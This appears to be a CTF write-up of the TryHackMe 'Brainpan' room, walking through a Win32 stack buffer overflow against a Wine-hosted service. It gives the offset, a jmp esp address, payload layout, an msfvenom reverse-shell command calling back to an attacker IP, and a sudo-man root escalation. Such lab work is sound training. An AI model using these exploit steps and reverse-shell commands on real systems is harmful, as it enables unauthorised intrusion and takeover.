---
title: TryHackMe - Win32 Remote Buffer Overflow Challenge - Brainpan
author: vrls
date: 2020-07-10
#categories: [TOP_CATEGORIE, SUB_CATEGORIE]
tags: [tryhackme, ctf, win32, buffer, overflow, brainpan]
image: /assets/img/posts/2020/07/036945e91901ed7a9140b3a4bce1d7a4.png
---

<!--  ![image](/assets/img/posts/2020/07/036945e91901ed7a9140b3a4bce1d7a4.png) -->

## Introduction

This *easy* challenge requires analyzing a PE32 executable file by reversing it and find a buffer overflow vulnerability in order to achieve RCE.
We are given an IP address, instead of an expected binary executable file. 


## Enumeration

Starting with a quick Nmap scan we discover two open ports: **9999** & **10000**  (web server). 


![image](/assets/img/posts/2020/07/d5cdcdfb48bd60cad7b7b8a04f8012f6.png)

By accessing *http://10.10.145.154:10000/* through web browser we are presented with a fancy image suggesting to practice safe programming. 

![image](/assets/img/posts/2020/07/c0e111c46203b772c02c620b4c0562bb.png)

While running sub-directory scanner it found the directory **/bin/** with *Directory Listing* enabled and containing an **.exe** file.

![image](/assets/img/posts/2020/07/a203e53f184013329cc3d9bcb619f747.png)

Also, connecting via Netcat to the other port **9999** displays the following terminal which is probably served by the file we just found on **/bin/** directory of web server. 

![image](/assets/img/posts/2020/07/23bd33112de752f1e307b3da66910cae.png)

Now the current plan to hack the machine is:

* Reverse engineer the executable
* Find a buffer overflow vulnerability
* Exploit the vulnerability
* Gain initial foothold on remote machine
* Try to escalate privilages


## Reversing

In summary, this simple application starts by initializing a socket Winsock to be able to establish TCP/IP connections via 9999 port and then receives the user input.

This input is stored in a buffer with an approximate capacity of *0x208* bytes (that is roughly 520 bytes) and then compares with string **shitstorm**, which is the correct password to be "granted access". 

![image](/assets/img/posts/2020/07/009c2da76ef4292c011381fd2fa10d8d.png)

Note that the function being used *strcpy()* does not specify the size of destination array thus it does not prevent overwriting other data outside the current buffer limit (buffer overflow).

To fix this issue, the current string copy function should be replaced with *str**n**cpy()* to specify the limit of characters to be read into the buffer. This function has a better security approach since it does ensure only first **n** bytes are copied, preventing overflow.

## Exploit

As usual, we start by sending a lot of bytes to crash the program and confirm the overflow. Sending a total of *1024 A's* will terminate the process and display the following exception. Note this was performed in a Windows virtual environment as we don't have control over the target machine, yet. 

![image](/assets/img/posts/2020/07/b03c5a9e4282cd9c3f2bd9328de697b5.png)

At this point, we can run *Immunity Debugger* to analyze program behavior during runtime by attaching to a running proces. It will be essential to be able to understand and write a basic exploit.

Instead of sending a sequence of *A's* we can generate a string pattern that contains unique substring sequences. This is particularly useful to locate specific elements and see how the input adjusts in stack.

The scripts **pattern_create.rb** and **pattern_offset.rb** are available within *Metasploit Framework* tools. 

![image](/assets/img/posts/2020/07/9c18a6232550428806aae2cba2c31e15.png)

If we provide this input to the running program while attached to *Immunity Debugger* it is possible to observe the actual state of registers and stack. 

![image](/assets/img/posts/2020/07/a2268eeb5e5989dd08fbfb23fdee954a.png)

The instruction pointer value was overwritten with **4Ar5**. By replacing the substring **4Ar5** with a valid instruction address, we are able to control EIP and decide which instruction will be executed next when the current procedure returns because we are overwriting the return address.

In a normal execution, the EIP should go back to the return address that was previously stored at the bottom of the current stack frame in order to let the program continue its normal execution.

We can also observe that stack pointer is pointing to overwritten content of the previous stack frame, beginning at **Ar6A** (eip+4). Its important to note that we can use this space to store shellcode and then set the EIP to that location.

Now the offset of both EIP and ESP may be calculated using **pattern_offset.rb** and providing both words. 

![image](/assets/img/posts/2020/07/d0f88386c85204de9145d27cc7670d01.png)


With the correct offset we can tweak our string to hold different values at different places. It should hold *524 A's* to fill the buffer plus the next 4 bytes will overwrite return address and the other next 4 bytes will be what stack pointer will be pointing to.

* **payload = 'A' * 524 + 'B' * 4**

It will cause the process to terminate due to *0x42424242* not being an address pointing to a valid instruction. 

![image](/assets/img/posts/2020/07/3832604f2e02d328436fe508f6a236e6.png)

At this point we are already able to build a solid payload. The structure should be similar to the following scheme: 

![image](/assets/img/posts/2020/07/3be1ed74de16b360e1a234a7b7705d1f.png)

Payload should contain *524 A's* followed by 4 bytes of a **jmp esp** instruction address, then a **NOP sled** and the shellcode.

The NOP sled will basically serve as a frame for where the ESP could be pointing to, to ensure that after the **jmp esp** instruction is executed, it will fall anywhere within the sled, and slide directly into the shellcode.

We can use *objdump* to find a jmp esp instruction address and use it to overwrite the return address. 

![image](/assets/img/posts/2020/07/8ffb153b1195da327ccf28dc91f955f0.png)


In this case, the payload should look like this:

* **payload = 'A' * 524 + '\xf3\x12\x17\x31' + '\x90' * 16 + '\<shellcode>'**

In other words:

* **payload = \<fill buf. w/ 524 bytes> + \<addr. of jmp esp instr.> + \<nop sled of 4 words> + \<shellcode>**

We should generate shellcode using msfvenom by executing the command:

```bash
$ msfvenom -p windows/shell/reverse_tcp RHOST=10.9.53.85 RPORT=1337 -a x86 -f python -b'\x00\x0a\x0d'.
```

The generated shellcode will connect-back to **10.9.53.85:1337** therefore we must setup a listener with **msfconsole**. Also it will be compatible with x86 architecture and outputted in Python syntax.

The shellcode must not contain bad chars: **\x00**, **\x0a** and **\x0d**. These bytes usually interfer when dealing with string manipulation functions (e.g. the \x00 denotes null-terminator for strings; if we include it then the program will consider it reached the end of string therefore leading to incomplete and damaged payload).

The final exploit looks like this:

![image](/assets/img/posts/2020/07/6e5b8a2775e2711a961680bf01e684af.png)

Setting up the listener on port **1337** to receive the incoming shell from target machine. *Bonus: HONK! :b*



![image](/assets/img/posts/2020/07/8e81af06eb8504f0a4eb387c75eb0304.png)


Finally! Executing the exploit pops a basic cmd shell. 

![image](/assets/img/posts/2020/07/ed484ee0de26059d2f10bec239a8cccf.png)



## Post-Exploitation

It is a surprise that the executable is being run through Wine enviornment, on a Linux machine. This shell is limited within Wine so we must *escape* and get a decent Bash. The most simple way is to navigate into **/bin/** and then execute **.\sh**.

Also, its usually a good idea to get one more different reverse shell. In case of failure, we have a backup and could easily start over without having to run the exploit again. The exploit could kill the service and we may lose further access to the machine.

This Python one-liner will send another shell back to our listening Netcat, at this time on port **1338**. 

![image](/assets/img/posts/2020/07/b981d5b8f841073a982272529b77a15b.png)

From now on it is quite trivial. First the dumb shell should be upgraded to an interactive one using:

```bash
python -c 'import pty; pty.spawn("/bin/sh");'
```

## Privilege Escalation

Then, having a look at current user puck **sudo privileges** there is one command that immediately stands out: **/home/anansi/bin/anansi_util**.

One of the available arguments is manual *\[command]*. It is obvious how to get root privileges by exploiting man, according to **GTFOBins**:

![image](/assets/img/posts/2020/07/f0fe0c615530e6f7a854573e7357a42e.png)

Running **sudo /home/anansi/bin/anansi_util manual man** followed by **!/bin/sh** spawns a **root shell**, thus bypassing local security restrictions! :) 

![image](/assets/img/posts/2020/07/c2932167fa3f0ef40f94e05abf8d83d7.png)

References:

* https://tryhackme.com/room/brainpan
* https://m0chan.github.io/2019/08/20/Simple-Win32-Buffer-Overflow-EIP-Overwrite.html
* https://netsec.ws/?p=337
* https://gtfobins.github.io/gtfobins/man/#shell
